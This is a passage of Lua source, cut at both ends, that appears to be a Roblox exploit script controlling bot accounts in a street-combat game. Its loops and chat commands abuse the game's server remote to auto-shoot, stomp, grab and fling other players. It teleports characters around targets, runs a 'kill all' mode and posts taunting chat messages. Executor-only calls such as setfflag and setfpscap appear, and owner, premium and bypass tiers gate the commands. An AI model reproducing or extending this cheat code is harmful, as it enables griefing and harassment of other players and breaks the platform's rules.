    State.summonTarget = nil
    State.flingOnly = false
    
    for _, targetPlayer in ipairs(Players:GetPlayers()) do
        local targetPlayerName = targetPlayer.Name:lower()
        local targetDisplayName = targetPlayer.DisplayName:lower()
        
        if (targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true)) and canTarget(LocalPlayer, targetPlayer) then
            State.targetPlayer = targetPlayer
            return
        end
    end
end

local function handleTakeCommand(targetName, destinationName)
    targetName = targetName:lower()
    if destinationName then
        destinationName = destinationName:lower()
    end
    
    local targetPlayer = nil
    local destinationPlayer = nil
    
    for _, player in ipairs(Players:GetPlayers()) do
        local playerName = player.Name:lower()
        local playerDisplay = player.DisplayName:lower()
        
        if playerName:find(targetName, 1, true) or playerDisplay:find(targetName, 1, true) then
            if canTarget(LocalPlayer, player) then
                targetPlayer = player
            end
        end
        
        if destinationName and (playerName:find(destinationName, 1, true) or playerDisplay:find(destinationName, 1, true)) then
            destinationPlayer = player
        end
    end
    
    if targetPlayer and destinationPlayer then
        State.savedTarget = destinationPlayer
        State.targetPlayer = targetPlayer
        reloadTool()
        State.stompOnly = false
        State.bringOnly = false
        State.downOnly = false
        State.opKill = false
        State.voiding = false
        State.takeOnly = true
        State.summonTarget = nil
        State.flingOnly = false
    end
end

local function handleGotoCommand(playerName, locationName)
    local player = Players:FindFirstChild(playerName)
    if not player then return end
    
    locationName = locationName:lower()
    
    local locationCFrames = {
        rifle = CFrame.new(-265, 52, -220),
        armor = CFrame.new(-933, -25, 570),
        lmg = CFrame.new(-618, 23, -299),
        mil = CFrame.new(36, 50, -830),
        military = CFrame.new(36, 50, -830),
        rev = CFrame.new(-639, 21, -125),
        revolver = CFrame.new(-639, 21, -125),
        food = CFrame.new(-327, 23, -291),
        food2 = CFrame.new(305, 49, -622),
        roof = CFrame.new(-326, 80, -293),
        bank = CFrame.new(-467, 39, -284),
        school = CFrame.new(-587, 68, 330),
        rpg = CFrame.new(113, -27, -268),
        uphill = CFrame.new(503, 48, -591),
        downhill = CFrame.new(-563, 8, -716)
    }
    
    State.gotoCFrame = locationCFrames[locationName]
    if not State.gotoCFrame then return end
    
    State.gotoPlayer = player
    State.targetPlayer = player
    reloadTool()
    State.stompOnly = false
    State.bringOnly = false
    State.downOnly = false
    State.opKill = false
    State.voiding = false
    State.takeOnly = true
    State.summonTarget = nil
    State.flingOnly = false
end

local function handleSkyCommand(username)
    local target = Players:FindFirstChild(username)
    if not target or not canTarget(LocalPlayer, target) then return end
    
    State.skyTarget = target
    State.targetPlayer = target
    
    reloadTool()
    State.stompOnly = false
    State.bringOnly = false
    State.downOnly = false
    State.opKill = false
    State.voiding = false
    State.takeOnly = true
    State.summonTarget = nil
    State.flingOnly = false
end

local function handleDownCommand(targetName, specificBot)
    targetName = targetName:lower()
    
    if LocalPlayer.Name ~= LocalPlayer.Name then return end
    
    reloadTool()
    State.targetPlayer = nil
    State.stompOnly = false
    State.bringOnly = false
    State.takeOnly = false
    State.downOnly = true
    State.opKill = false
    State.voiding = false
    State.summonTarget = nil
    State.flingOnly = false
    
    for _, targetPlayer in ipairs(Players:GetPlayers()) do
        local targetPlayerName = targetPlayer.Name:lower()
        local targetDisplayName = targetPlayer.DisplayName:lower()
        
        if (targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true)) and canTarget(LocalPlayer, targetPlayer) then
            State.targetPlayer = targetPlayer
            return
        end
    end
end

local function handleFixCommand(specificBot)
    if LocalPlayer.Name ~= LocalPlayer.Name then return end
    
    State.auraEnabled = false
    State.sentryEnabled = false
    State.multiTargets = {}
    State.targetPlayer = nil
    State.autoCashDrop = false
    State.buyingInProgress = false
    State.buyingGunInProgress = false
    State.buyingMaskInProgress = false
    State.voiding = true
    State.summonTarget = nil
    State.flingOnly = false
    State.killAll = false
    State.stompOnly = false
    State.bringOnly = false
    State.takeOnly = false
    State.downOnly = false
    State.opKill = false
    
    if LocalPlayer.Character then
        LocalPlayer.Character.Humanoid.Health = 0
    end
end

local function handleTeleportCommand(targetName, specificBot)
    State.auraEnabled = false
    State.multiTargets = {}
    State.targetPlayer = nil
    State.voiding = true
    State.summonTarget = Players:FindFirstChild(targetName)
end

local function handleHideCommand(specificBot)
    if LocalPlayer.Name ~= LocalPlayer.Name then return end
    
    State.auraEnabled = false
    State.multiTargets = {}
    State.targetPlayer = nil
    State.voiding = true
    State.summonTarget = nil
    reloadTool()
end

-- ==================== AURA LOOP ====================
task.spawn(function()
    while true do
        if State.auraEnabled and State.targetPlayer and LocalPlayer.Character and State.targetPlayer.Character and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) then
            local playerHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local targetHRP = State.targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            
            if playerHRP and targetHRP then
                playerHRP.Velocity = Vector3.zero
                playerHRP.RotVelocity = Vector3.zero
                
                State.auraAngle = State.auraAngle + State.auraSpeed * RunService.RenderStepped:Wait()
                local x = math.cos(State.auraAngle) * State.auraDistance
                local z = math.sin(State.auraAngle) * State.auraDistance
                local newPos = targetHRP.Position + Vector3.new(x, 0, z)
                
                playerHRP.CFrame = CFrame.new(newPos, newPos * 2 - targetHRP.Position)
            end
        end
        task.wait()
    end
end)

-- ==================== AUTO SHOOT LOOP ====================
RunService.Heartbeat:Connect(function()
    local targetChar = nil
    local target = nil
    
    if State.targetPlayer and State.targetPlayer.Character then
        targetChar = State.targetPlayer.Character
        target = State.targetPlayer
    elseif State.sentryTarget and State.sentryTarget.Character then
        targetChar = State.sentryTarget.Character
        target = State.sentryTarget
    end
    
    if not targetChar or not targetChar:FindFirstChild("HumanoidRootPart") then return end
    if target == LocalPlayer then
        State.targetPlayer = nil
        State.voiding = true
        return
    end
    
    if State.flingOnly and target then return end
    
    local targetPart = targetChar:FindFirstChild("Head") or targetChar:FindFirstChild("HumanoidRootPart")
    local bodyEffects = targetChar:FindFirstChild("BodyEffects")
    local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
    local isGrabbed = targetChar:FindFirstChild("GRABBING_CONSTRAINT")
    
    if isKO or isGrabbed or not targetPart then return end
    
    local playerChar = LocalPlayer.Character
    if not playerChar then return end
    
    for _, tool in ipairs(playerChar:GetChildren()) do
        if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
            local handle = tool.Handle
            ReplicatedStorage.MainEvent:FireServer(
                "ShootGun",
                handle,
                handle.Position,
                targetPart.Position,
                targetPart,
                Vector3.new(0, 0, 0)
            )
        end
    end
end)

-- ==================== AUTO AIM LOOP ====================
RunService.Heartbeat:Connect(function()
    if State.auraEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character:FindFirstChildOfClass("Tool") then
        local koValue = LocalPlayer.Character:FindFirstChild("BodyEffects") and LocalPlayer.Character.BodyEffects:FindFirstChild("K.O")
        if koValue and koValue.Value then return end
        
        local closest = math.huge
        local target = nil
        
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and not WhitelistedUsers[player.Name] and not ProtectedUsers[player.UserId] and player.Character and player.Character:FindFirstChild("Head") and not player.Character:FindFirstChild("GRABBING_CONSTRAINT") and not player.Character:FindFirstChild("ForceField") then
                if Workspace:FindFirstChild("Players") and Workspace.Players:FindFirstChild(player.Name) and Workspace.Players[player.Name]:FindFirstChild("BodyEffects") and Workspace.Players[player.Name].BodyEffects:FindFirstChild("K.O") and not Workspace.Players[player.Name].BodyEffects["K.O"].Value then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - player.Character.Head.Position).Magnitude
                    if dist < closest then
                        closest = dist
                        target = player
                    end
                end
            end
        end
        
        if target and target.Character and target.Character:FindFirstChild("Head") then
            for _, tool in pairs(LocalPlayer.Character:GetChildren()) do
                if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
                    ReplicatedStorage.MainEvent:FireServer(
                        "ShootGun",
                        tool.Handle,
                        tool.Handle.Position,
                        target.Character.Head.Position,
                        target.Character.Head,
                        Vector3.new(0, 0, 0)
                    )
                end
            end
        end
    end
end)

-- ==================== MAIN COMBAT LOOP ====================
local canRun = true

task.spawn(function()
    while true do
        task.wait()
        
        if State.targetPlayer and not State.stompOnly and not State.bringOnly and not State.takeOnly and not State.downOnly and not State.opKill and not State.flingOnly and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) then
            local targetChar = State.targetPlayer.Character
            local myChar = LocalPlayer.Character
            
            if targetChar and myChar then
                local bodyEffects = targetChar:FindFirstChild("BodyEffects")
                local myBodyEffects = myChar:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                local isNil = not targetChar:FindFirstChild("UpperTorso") or not targetChar:FindFirstChild("Head")
                local hasForceField = targetChar:FindFirstChildOfClass("ForceField")
                local isReloading = myBodyEffects and myBodyEffects:FindFirstChild("Reload") and myBodyEffects["Reload"].Value
                local myHasForceField = myChar:FindFirstChildOfClass("ForceField")
                
                if State.abuseProtection and not myHasForceField and not isReloading and not State.refreshingFakePosition then
                    local humanoid = myChar:FindFirstChild("Humanoid")
                    if humanoid then
                        canRun = false
                        State.voiding = true
                        State.teleporting = false
                        task.wait(0.1)
                        humanoid.Health = 0
                        task.wait(0.1)
                        canRun = true
                    end
                end
                
                if (isSDeath or isNil) and not isReloading and canRun then
                    State.teleporting = false
                    State.voiding = true
                    reloadTool()
                    
                    if not State.didRefreshOnDeath and State.fpActive then
                        State.didRefreshOnDeath = true
                        task.delay(0.2, function()
                            State.refreshingFakePosition = true
                            setfflag("S2PhysicsSenderRate", 0)
                            setfpscap(4)
                            task.wait(0.1)
                            setfflag("S2PhysicsSenderRate", 20000000000)
                            setfpscap(240)
                            task.wait(3.65)
                            State.refreshingFakePosition = false
                        end)
                    end
                    
                elseif isKO and not isSDeath and not isGrabbed and not isNil and not isReloading and canRun and not State.refreshingFakePosition then
                    State.voiding = false
                    State.teleporting = false
                    
                    local upperTorso = targetChar:FindFirstChild("UpperTorso")
                    if upperTorso and LocalPlayer.Character then
                        local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if humanoidRootPart then
                            humanoidRootPart.Velocity = Vector3.zero
                            humanoidRootPart.RotVelocity = Vector3.zero
                            humanoidRootPart.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                            
                            if State.trashTalk and not State.hasSentKOMessage then
                                sendChat("Get Sandy")
                                sendChat("Sandy dominated again!")
                                State.hasSentKOMessage = true
                            end
                        end
                    end
                    
                elseif not isKO and not isSDeath and not hasForceField and not isGrabbed and not isNil and not isReloading and canRun and not State.refreshingFakePosition then
                    State.teleporting = true
                    State.voiding = false
                    State.hasSentKOMessage = false
                    
                elseif isReloading and not State.refreshingFakePosition then
                    State.teleporting = false
                    State.voiding = true
                    
                elseif hasForceField and not isReloading and not State.refreshingFakePosition then
                    State.teleporting = false
                    State.voiding = true
                    reloadTool()
                end
            end
            
            ReplicatedStorage.MainEvent:FireServer("Stomp")
        end
    end
end)

-- Stomp only loop
task.spawn(function()
    while true do
        task.wait()
        
        if State.stompOnly and not State.bringOnly and not State.takeOnly and not State.downOnly and not State.opKill and State.targetPlayer and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) then
            local targetChar = State.targetPlayer.Character
            
            if targetChar then
                local bodyEffects = targetChar:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                
                if isKO and not isSDeath then
                    State.teleporting = false
                    State.voiding = false
                    
                    local upperTorso = targetChar:FindFirstChild("UpperTorso")
                    if upperTorso and LocalPlayer.Character then
                        local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if humanoidRootPart then
                            humanoidRootPart.Velocity = Vector3.zero
                            humanoidRootPart.RotVelocity = Vector3.zero
                            humanoidRootPart.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                        end
                    end
                    
                    if State.trashTalk and not State.hasSentKOMessage then
                        sendChat("Get Sandy")
                        State.hasSentKOMessage = true
                    end
                    
                elseif isSDeath then
                    State.targetPlayer = nil
                    State.teleporting = false
                    State.voiding = true
                    reloadTool()
                    
                elseif not isKO and not isSDeath then
                    State.teleporting = true
                    State.voiding = false
                    State.hasSentKOMessage = false
                end
            end
            
            ReplicatedStorage.MainEvent:FireServer("Stomp")
        end
    end
end)

-- Bring loop
local bringConnection = nil

task.spawn(function()
    while true do
        task.wait()
        
        if State.bringOnly and State.targetPlayer and State.targetPlayer.Character and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) then
            local targetChar = State.targetPlayer.Character
            local bodyEffects = targetChar and targetChar:FindFirstChild("BodyEffects")
            local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
            local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
            
            local grabbed = false
            
            if targetChar:FindFirstChild("GRABBING_CONSTRAINT") then
                grabbed = true
            end
            
            if bringConnection then
                bringConnection:Disconnect()
                bringConnection = nil
            end
            
            bringConnection = targetChar.ChildAdded:Connect(function(child)
                if child.Name == "GRABBING_CONSTRAINT" then
                    grabbed = true
                end
            end)
            
            local humanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local upperTorso = targetChar and targetChar:FindFirstChild("UpperTorso")
            
            if not grabbed and isKO and humanoidRootPart and upperTorso then
                State.teleporting = false
                State.voiding = false
                
                humanoidRootPart.Velocity = Vector3.zero
                humanoidRootPart.RotVelocity = Vector3.zero
                humanoidRootPart.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                task.wait(0.3)
            else
                State.teleporting = true
                State.voiding = false
            end
            
            if grabbed then
                State.targetPlayer = nil
                if bringConnection then
                    bringConnection:Disconnect()
                    bringConnection = nil
                end
                State.voiding = true
                reloadTool()
            end
        end
    end
end)

-- Take loop
local takeConnection = nil

task.spawn(function()
    while true do
        task.wait()
        
        if State.takeOnly and State.targetPlayer and State.targetPlayer.Character and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) then
            local targetChar = State.targetPlayer.Character
            local bodyEffects = targetChar and targetChar:FindFirstChild("BodyEffects")
            local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
            local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
            
            local grabbed = false
            
            if targetChar:FindFirstChild("GRABBING_CONSTRAINT") then
                grabbed = true
            end
            
            if takeConnection then
                takeConnection:Disconnect()
                takeConnection = nil
            end
            
            takeConnection = targetChar.ChildAdded:Connect(function(child)
                if child.Name == "GRABBING_CONSTRAINT" then
                    grabbed = true
                end
            end)
            
            local humanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local upperTorso = targetChar and targetChar:FindFirstChild("UpperTorso")
            
            if not grabbed and isKO and humanoidRootPart and upperTorso then
                State.teleporting = false
                State.voiding = false
                
                humanoidRootPart.Velocity = Vector3.zero
                humanoidRootPart.RotVelocity = Vector3.zero
                humanoidRootPart.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                task.wait(0.3)
            else
                State.teleporting = true
                State.voiding = false
            end
            
            if grabbed then
                local myChar = LocalPlayer.Character
                local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                
                if State.skyTarget and myHRP then
                    State.targetPlayer = nil
                    myHRP.CFrame = CFrame.new(0, -999999999, 0)
                    task.wait(0.3)
                    ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                    task.wait(0.3)
                    State.voiding = true
                    reloadTool()
                    State.skyTarget = nil
                end
                
                if State.gotoCFrame and State.gotoPlayer and myHRP then
                    State.targetPlayer = nil
                    myHRP.CFrame = State.gotoCFrame
                    task.wait(0.3)
                    ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                    task.wait(0.3)
                    State.voiding = true
                    reloadTool()
                    State.gotoPlayer = nil
                    State.gotoCFrame = nil
                end
                
                if State.savedTarget then
                    local destChar = State.savedTarget.Character
                    if destChar and destChar:FindFirstChild("HumanoidRootPart") and myHRP then
                        State.targetPlayer = nil
                        local destPos = destChar.HumanoidRootPart.Position
                        teleportToPosition(destPos)
                        task.wait(0.3)
                        ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                        task.wait(0.3)
                        State.voiding = true
                        reloadTool()
                    end
                    State.savedTarget = nil
                end
                
                if takeConnection then
                    takeConnection:Disconnect()
                    takeConnection = nil
                end
            end
        end
    end
end)

-- Down only loop
task.spawn(function()
    while true do
        task.wait()
        
        if State.downOnly and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) and not State.stompOnly and not State.bringOnly and not State.takeOnly and not State.opKill and State.targetPlayer then
            local targetChar = State.targetPlayer.Character
            
            if targetChar then
                local bodyEffects = targetChar:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                
                if not isKO and not isSDeath then
                    State.teleporting = true
                    State.voiding = false
                elseif isKO or isSDeath then
                    State.targetPlayer = nil
                    State.voiding = true
                    reloadTool()
                end
            end
        end
    end
end)

-- OP Kill loop
task.spawn(function()
    while true do
        task.wait()
        
        if State.opKill and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) and not State.stompOnly and not State.bringOnly and not State.takeOnly and not State.downOnly and State.targetPlayer then
            local targetChar = State.targetPlayer.Character
            
            if targetChar then
                local bodyEffects = targetChar:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                local isGrabbed = targetChar:FindFirstChild("GRABBING_CONSTRAINT")
                local hasForceField = targetChar:FindFirstChildOfClass("ForceField")
                
                if not isKO and not isSDeath and not isGrabbed and not hasForceField then
                    State.teleporting = true
                    State.voiding = false
                elseif isKO or isSDeath or isGrabbed or hasForceField then
                    State.voiding = true
                    State.teleporting = false
                end
            end
        end
    end
end)

-- Fling loop
task.spawn(function()
    while true do
        task.wait()
        
        if State.flingOnly and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) and not State.stompOnly and not State.bringOnly and not State.takeOnly and not State.downOnly and State.targetPlayer then
            local char = LocalPlayer.Character
            local targetHRP = State.targetPlayer.Character and State.targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            
            if char and char:FindFirstChild("HumanoidRootPart") and targetHRP then
                State.teleporting = true
                State.voiding = false
                
                char.HumanoidRootPart.CFrame = CFrame.new(
                    targetHRP.Position + Vector3.new(0, 0, math.random(-30, 30))
                )
            end
        end
    end
end)

-- Fling velocity loop
RunService.Heartbeat:Connect(function()
    if State.flingOnly and State.targetPlayer and LocalPlayer.Character then
        LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(99999999, 99999999, 99999999)
        RunService.RenderStepped:Wait()
        LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
    end
end)

-- Kill all loop
task.spawn(function()
    while true do
        task.wait()
        
        if State.killAll and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) then
            local switchTarget = false
            
            if State.targetPlayer and State.targetPlayer.Character then
                local targetChar = State.targetPlayer.Character
                local bodyEffects = targetChar:FindFirstChild("BodyEffects")
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                
                if isSDeath then
                    switchTarget = true
                end
            else
                switchTarget = true
            end
            
            if switchTarget then
                local candidates = {}
                
                for _, player in pairs(Players:GetPlayers()) do
                    if player.Name ~= Owner and player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("BodyEffects") and player.Character.BodyEffects:FindFirstChild("SDeath") and not player.Character.BodyEffects["SDeath"].Value and not player.Character:FindFirstChild("GRABBING_CONSTRAINT") and canTarget(LocalPlayer, player) then
                        table.insert(candidates, player)
                    end
                end
                
                if #candidates > 0 then
                    State.targetPlayer = candidates[math.random(1, #candidates)]
                end
            end
        end
    end
end)

-- Teleport loop
task.spawn(function()
    while true do
        task.wait()
        
        if State.teleporting and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) then
            local targetChar = nil
            
            if State.targetPlayer and State.targetPlayer.Character then
                targetChar = State.targetPlayer.Character
            elseif State.sentryTarget and State.sentryTarget.Character then
                targetChar = State.sentryTarget.Character
            end
            
            if targetChar and LocalPlayer.Character then
                local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
                local playerHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                
                if targetHRP and playerHRP then
                    playerHRP.CFrame = CFrame.lookAt(
                        targetHRP.Position + Vector3.new(math.random(-20, 20), math.random(-20, 20), math.random(-20, 20)),
                        targetHRP.Position
                    )
                end
            end
        end
    end
end)

-- Sentry mode loop
task.spawn(function()
    while true do
        task.wait(0.2)
        
        if State.sentryEnabled and not State.targetPlayer then
            local playersToCheck = {Owner}
            
            for pname, _ in pairs(SentryProtected) do
                table.insert(playersToCheck, pname)
            end
            
            for _, pname in ipairs(playersToCheck) do
                local player = Players:FindFirstChild(pname)
                
                if player and player.Character then
                    local char = player.Character
                    local bodyEffects = char:FindFirstChild("BodyEffects")
                    local lastDamager = bodyEffects and bodyEffects:FindFirstChild("LastDamager")
                    local humanoid = char:FindFirstChildOfClass("Humanoid")
                    
                    if bodyEffects and lastDamager and humanoid then
                        local healthNow = humanoid.Health
                        
                        if State.lastHealths[pname] == nil then
                            State.lastHealths[pname] = healthNow
                        end
                        
                        if healthNow + 0.05 < State.lastHealths[pname] then
                            State.lastHealths[pname] = healthNow
                            task.wait(0.1)
                            
                            local recheck = char:FindFirstChild("BodyEffects"):FindFirstChild("LastDamager")
                            local attackerName = recheck and tostring(recheck.Value)
                            
                            if attackerName ~= "" then
                                local attacker = Players:FindFirstChild(attackerName)
                                if attacker and canTarget(LocalPlayer, attacker) then
                                    State.sentryTarget = attacker
                                    State.teleporting = true
                                    State.voiding = false
                                end
                            end
                        else
                            State.lastHealths[pname] = healthNow
                        end
                    end
                else
                    State.lastHealths[pname] = nil
                end
            end
            
            if State.sentryTarget and State.sentryTarget.Character then
                local atkChar = State.sentryTarget.Character
                local atkBE = atkChar:FindFirstChild("BodyEffects")
                local isKO = atkBE and atkBE:FindFirstChild("K.O") and atkBE["K.O"].Value
                
                if isKO then
                    State.sentryTarget = nil
                    State.teleporting = false
                    State.voiding = true
                    reloadTool()
                end
            end
        end
    end
end)

-- Summon loop
task.spawn(function()
    while true do
        task.wait()
        
        if State.summonTarget and State.summonTarget.Character and not (State.buyingInProgress or State.buyingGunInProgress or State.buyingMaskInProgress) then
            local lp = LocalPlayer
            if not lp.Character then continue end
            
            local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
            local thrp = State.summonTarget.Character:FindFirstChild("HumanoidRootPart")
            
            if hrp and thrp then
                hrp.Velocity = Vector3.zero
                hrp.RotVelocity = Vector3.zero
                
                local offset
                if State.summonMode == "middle" then
                    offset = CFrame.new(0, 3, 4)
                elseif State.summonMode == "right" then
                    offset = CFrame.new(3, 3, 0)
                elseif State.summonMode == "left" then
                    offset = CFrame.new(-3, 3, 0)
                else
                    offset = CFrame.new(0, 3, 4)
                end
                
                hrp.CFrame = thrp.CFrame * offset
                hrp.Velocity = Vector3.zero
            end
        end
    end
end)

-- Target tracking
local lockedTargetUserId = nil
local autoLocked = false

task.spawn(function()
    while true do
        task.wait()
        
        if not State.targetPlayer and lockedTargetUserId and not autoLocked then
            for _, player in ipairs(Players:GetPlayers()) do
                if player.UserId == lockedTargetUserId then
                    State.targetPlayer = player
                    autoLocked = true
                    break
                end
            end
        end
        
        if State.targetPlayer then
            lockedTargetUserId = State.targetPlayer.UserId
            
            local targetChar = State.targetPlayer.Character
            if targetChar then
                local bodyEffects = targetChar:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                
                if isKO and State.trashTalk and not State.hasSentKOMessage then
                    sendChat("Get Sandy")
                    sendChat("Sandy dominated again!")
                    State.hasSentKOMessage = true
                elseif not isKO then
                    State.hasSentKOMessage = false
                end
            end
            
            if not State.targetPlayer:IsDescendantOf(game) then
                lockedTargetUserId = State.targetPlayer.UserId
                State.targetPlayer = nil
                autoLocked = false
                State.voiding = true
            end
        end
    end
end)

-- ==================== CHAT COMMANDS ====================
local function handleChatCommand(sender, message)
    if not sender then return end
    
    local msgLower = message:lower()
    local words = {}
    for word in msgLower:gmatch("%S+") do
        table.insert(words, word)
    end
    
    if #words == 0 then return end
    
    local senderTier = getUserTier(sender)
    
    -- ===== OWNER ONLY COMMANDS =====
    if sender.Name == Owner then
        if msgLower:match("^%.wl%s+(.+)$") then
            local input = msgLower:match("^%.wl%s+(.+)$")
            for _, plr in pairs(Players:GetPlayers()) do
                local name = plr.Name:lower()
                local display = plr.DisplayName:lower()
                if name:find(input, 1, true) or display:find(input, 1, true) then
                    WhitelistedUsers[plr.Name] = true
                    sendChat("Whitelisted: " .. plr.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.unwl%s+(.+)$") then
            local input = msgLower:match("^%.unwl%s+(.+)$")
            for _, plr in pairs(Players:GetPlayers()) do
                local name = plr.Name:lower()
                local display = plr.DisplayName:lower()
                if name:find(input, 1, true) or display:find(input, 1, true) then
                    WhitelistedUsers[plr.Name] = nil
                    sendChat("Unwhitelisted: " .. plr.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.assist%s+([^%s]+)$") then
            local input = msgLower:match("^%.assist%s+([^%s]+)$")
            for _, plr in pairs(Players:GetPlayers()) do
                local name = plr.Name:lower()
                local display = plr.DisplayName:lower()
                if name:find(input, 1, true) or display:find(input, 1, true) then
                    SentryProtected[plr.Name] = true
                    sendChat("Sentry protecting: " .. plr.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.unassist%s+(.+)$") then
            local input = msgLower:match("^%.unassist%s+(.+)$")
            for _, plr in pairs(Players:GetPlayers()) do
                local name = plr.Name:lower()
                local display = plr.DisplayName:lower()
                if name:find(input, 1, true) or display:find(input, 1, true) then
                    SentryProtected[plr.Name] = nil
                    sendChat("No longer protecting: " .. plr.Name)
                    break
                end
            end
        end
    end
    
    -- ===== PREMIUM & BYPASS COMMANDS =====
    if senderTier == "premium" or senderTier == "bypass" or sender.Name == Owner then
        
        if msgLower == ".a on" then
            State.targetPlayer = nil
            State.voiding = false
            State.auraEnabled = true
            sendChat("Aura enabled")
            
        elseif msgLower == ".a off" then
            State.auraEnabled = false
            sendChat("Aura disabled")
            
        elseif msgLower == ".sentry on" then
            State.targetPlayer = nil
            State.voiding = false
            State.sentryEnabled = true
            sendChat("Sentry mode enabled")
            
        elseif msgLower == ".sentry off" then
            State.sentryEnabled = false
            sendChat("Sentry mode disabled")
            
        elseif msgLower == ".bsentry on" then
            for plrName, _ in pairs(BypassPremiumUsers) do
                SentryProtected[plrName] = true
            end
            sendChat("Bulk sentry enabled")
            
        elseif msgLower == ".bsentry off" then
            for plrName, _ in pairs(BypassPremiumUsers) do
                SentryProtected[plrName] = nil
            end
            sendChat("Bulk sentry disabled")
            
        elseif msgLower == ".repair" then
            handleFixCommand()
            
        elseif msgLower:match("^%.repair%s+([^%s]+)$") then
            local botName = msgLower:match("^%.repair%s+([^%s]+)$")
            handleFixCommand(botName)
            
        elseif msgLower == ".v" then
            handleHideCommand()
            
        elseif msgLower:match("^%.v%s+([^%s]+)$") then
            local botName = msgLower:match("^%.v%s+([^%s]+)$")
            handleHideCommand(botName)
            
        elseif msgLower == ".summon" then
            handleTeleportCommand(sender.Name)
            
        elseif msgLower:match("^%.summon%s+([^%s]+)$") then
            local botName = msgLower:match("^%.summon%s+([^%s]+)$")
            handleTeleportCommand(sender.Name, botName)
            
        elseif msgLower == ".s" then
            teleportToTarget(sender.Name)
            
        elseif msgLower == ".search" then
            State.targetPlayer = nil
            State.voiding = false
            teleportPlayerRandomly()
            task.wait(1)
            checkWhitelistNearPosition()
            task.wait(1)
            State.voiding = true
            sendChat("Search complete")
            
        elseif msgLower == ".cashdrop on" then
            State.autoCashDrop = true
            sendChat("Auto cash drop enabled")
            
        elseif msgLower == ".cashdrop off" then
            State.autoCashDrop = false
            sendChat("Auto cash drop disabled")
            
        elseif msgLower == ".abuse on" then
            State.abuseProtection = true
            sendChat("Abuse protection enabled")
            
        elseif msgLower == ".abuse off" then
            State.abuseProtection = false
            sendChat("Abuse protection disabled")
            
        elseif msgLower == ".mask on" then
            State.autoMask = true
            sendChat("Auto mask enabled")
            
        elseif msgLower == ".mask off" then
            State.autoMask = false
            sendChat("Auto mask disabled")
            
        elseif EMOTES[msgLower] then
            playAnimation(EMOTES[msgLower])
            
        elseif msgLower == ".stop" then
            if currentTrack then
                currentTrack:Stop()
                currentTrack = nil
            end
            
        elseif msgLower == ".fp on" then
